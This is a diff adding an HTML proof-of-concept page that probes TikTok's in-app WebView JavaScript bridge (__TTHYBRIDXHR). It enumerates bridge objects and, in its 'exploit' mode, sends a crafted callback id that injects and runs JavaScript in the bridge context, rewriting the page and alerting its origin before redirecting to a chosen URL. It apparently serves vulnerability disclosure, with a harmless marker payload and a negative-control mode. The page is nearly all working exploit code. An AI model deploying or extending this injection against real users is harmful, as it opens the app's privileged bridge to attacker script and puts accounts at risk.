@@ -1,0 +1,97 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>TikTok TTHYBRIDXHR callback probe</title>
+<style>
+  :root { color-scheme: light dark; font-family: system-ui, sans-serif; }
+  body { margin: 2rem; max-width: 48rem; }
+  code, pre { overflow-wrap: anywhere; }
+  pre { padding: 1rem; border: 1px solid #8886; border-radius: .5rem; }
+  button { padding: .75rem 1rem; font: inherit; }
+</style>
+<h1>TikTok WebView callback probe</h1>
+<p>This page sends one harmless delayed request through
+  <code>__TTHYBRIDXHR</code>. It never reads account data.</p>
+<button id="run" type="button">Run bridge probe</button>
+<pre id="status">ready</pre>
+<script>
+(() => {
+  const params = new URLSearchParams(location.search);
+  const mode = params.get('mode') || 'probe';
+  const target = params.get('target') || 'https://example.com/';
+  const slow = params.get('slow') ||
+    'https://binance-c2c-stale-callback-poc.vercel.app/api/binance-slow?ms=5000&tiktok_probe=1';
+  const status = document.querySelector('#status');
+  const runButton = document.querySelector('#run');
+
+  function write(value) {
+    status.textContent = typeof value === 'string'
+      ? value
+      : JSON.stringify(value, null, 2);
+  }
+
+  function arm() {
+    const names = [
+      '__TTHYBRIDXHR', 'TTHYBRIDXHR', 'ToutiaoJSBridge',
+      'Native2JSBridge', 'BDXBridge', 'iesJsBridgeTransferMonitor',
+      'WebReport', 'WIReport', 'JSBridge', 'webkit'
+    ];
+    const globals = Object.fromEntries(names.map(name => {
+      const value = window[name];
+      let keys = [];
+      try { keys = value ? Object.keys(value).slice(0, 30) : []; } catch (_) {}
+      return [name, { type: typeof value, keys }];
+    }));
+    const bridge = window.__TTHYBRIDXHR;
+    if (!bridge || typeof bridge.postMessage !== 'function') {
+      write({
+        bridgePresent: false,
+        origin,
+        mode,
+        globals
+      });
+      return;
+    }
+
+    const marker = '<h1 id="PoC_by_ContractGooner">PoC_by_ContractGooner</h1>';
+    const injectedId = '"+(document.body.innerHTML=' + JSON.stringify(marker) +
+      ',alert(origin),"x")+"';
+    const id = mode === 'negative' ? 'safe-negative-control' : injectedId;
+    const message = JSON.stringify({
+      id,
+      method: 'GET',
+      url: slow,
+      data: '',
+      headers: {}
+    });
+
+    let result;
+    try {
+      result = bridge.postMessage(message);
+    } catch (error) {
+      write({ bridgePresent: true, callError: String(error), origin, mode });
+      return;
+    }
+
+    write({
+      bridgePresent: true,
+      postMessageResult: String(result),
+      origin,
+      mode,
+      target,
+      idLength: id.length,
+      globals
+    });
+
+    if ((mode === 'exploit' || mode === 'negative') && String(result) === 'success') {
+      setTimeout(() => location.replace(target), 150);
+    }
+  }
+
+  runButton.addEventListener('click', arm);
+  if (mode !== 'probe') {
+    runButton.hidden = true;
+    setTimeout(arm, 250);
+  }
+})();
+</script>
